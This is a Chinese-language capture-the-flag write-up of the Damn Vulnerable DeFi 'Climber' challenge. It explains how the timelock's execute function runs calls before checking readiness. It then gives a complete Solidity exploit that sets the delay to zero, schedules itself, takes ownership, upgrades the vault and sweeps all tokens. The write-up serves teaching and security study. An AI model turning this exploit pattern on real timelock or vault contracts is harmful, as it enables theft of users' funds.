## 题目 [Climber](https://github.com/theredguild/damn-vulnerable-defi/tree/v4.0.0/src/climber)

有一个安全的保险库合约，守护着 1000 万个 DVT 代币。这个保险库是可升级的，遵循 [UUPS 模式](https://eips.ethereum.org/EIPS/eip-1822)。  

保险库的所有者是一个时间锁合约。它每 15 天可以提取有限数量的代币。  

在保险库中，还有一个额外的角色，拥有在紧急情况下清空所有代币的权限。  

在时间锁合约中，只有拥有“提议者”角色的账户可以安排操作，这些操作可以在 1 小时后执行。  

你必须从保险库中救出所有代币并将其存入指定的恢复账户。  


## 题解
先说下时间锁中的操作状态：  
- Unknown: 操作未被注册（即该操作不存在）。
- Scheduled: 操作已经被注册并计划执行，但还未到达可以执行的时间。
- ReadyForExecution: 操作已经准备好可以执行（已经到达或超过了规定的延迟时间）。
- Executed: 操作已经被执行。

漏洞在 `ClimberTimelock` 合约的 `execute` 函数中，先对输入的调用进行执行，然后在对该调用进行是否在 `ReadyForExecution` 状态进行检查，这两个顺序写反了。  
``` solidity
    function execute(address[] calldata targets, uint256[] calldata values, bytes[] calldata dataElements, bytes32 salt)
        external
        payable
    {
        ...

        for (uint8 i = 0; i < targets.length; ++i) {
            targets[i].functionCallWithValue(dataElements[i], values[i]);
        }

        if (getOperationState(id) != OperationState.ReadyForExecution) {
            revert NotReadyForExecution(id);
        }

        operations[id].executed = true;
    }
```

正常情况下，应该是提案者进行提案，提案进入 `Scheduled` 的状态，然后到达延迟时间后，进入了 `ReadyForExecution` 状态，之后任何地址都可以调用 `execute` 函数，来执行提案。  

由于在 `execute` 中是先执行提案调用，那么我们可以做一个恶意的提案，其中修改延迟时间为 0，那么在执行了这些操作后，最后再 `schedule` 这个提案，这个提案立即就是 `ReadyForExecution` 状态了，所以后面的判断能通过。  

并且在 `updateDelay` 函数中，没有对延迟时间的最小限制。  
``` solidity
    function updateDelay(uint64 newDelay) external {
        if (msg.sender != address(this)) {
            revert CallerNotTimelock();
        }

        if (newDelay > MAX_DELAY) {
            revert NewDelayAboveMax();
        }

        delay = newDelay;
    }
```

具体步骤如下：  
1. 设计提案内容：
   - 把攻击合约设置为提案人。
   - 设置延迟时间为 0 。
   - 转移金库权限为攻击合约。
   - 对本提案中的内容列入时间表内。
2. 对金库合约进行升级，增加把所有代币转移的恢复地址的方法。
3. 执行转账方法。

POC:  
``` solidity
contract ClimberVaultV2 is ClimberVault {
    function sweepFunds(address token, address recovery) external {
        IERC20(token).transfer(recovery, IERC20(token).balanceOf(address(this)));
    }
}

contract ClimberExploit {
    ClimberTimelock timelock;
    ClimberVault vault;
    address token;
    address recovery;

    uint256[] private _values = [0, 0, 0, 0];
    address[] private _targets = new address[](4);
    bytes[] private _elements = new bytes[](4);
    
    constructor(address payable _timelock, address _vault, address _token, address _recovery) {
        timelock = ClimberTimelock(_timelock);
        token = _token;
        vault = ClimberVault(_vault);
        recovery = _recovery;
        _targets = [_timelock, _timelock, _vault, address(this)];
        _elements[0] = (
            abi.encodeWithSignature("grantRole(bytes32,address)", keccak256("PROPOSER_ROLE"), address(this))
        );
        _elements[1] = abi.encodeWithSignature("updateDelay(uint64)", 0);
        _elements[2] = abi.encodeWithSignature("transferOwnership(address)", address(this));
        _elements[3] = abi.encodeWithSignature("timelockSchedule()");
    }

    function timelockSchedule() external {
        timelock.schedule(_targets, _values, _elements, 0);
    }

    function attack() external {
        timelock.execute(_targets, _values, _elements, 0);
        vault.upgradeToAndCall(address(new ClimberVaultV2()), "");
        ClimberVaultV2(address(vault)).sweepFunds(token, recovery);
    }

}
```
test_climber：  
``` solidity
    function test_climber() public checkSolvedByPlayer {
        ClimberExploit climberExploit = new ClimberExploit(payable(timelock), address(vault), address(token), recovery);
        climberExploit.attack();
    }
```
运行测试： 
```
forge test --mp test/climber/Climber.t.sol 
```
测试结果：
```
Ran 2 tests for test/climber/Climber.t.sol:ClimberChallenge
[PASS] test_assertInitialState() (gas: 63711)
[PASS] test_climber() (gas: 4232141)
Suite result: ok. 2 passed; 0 failed; 0 skipped; finished in 9.91ms (2.44ms CPU time)
```

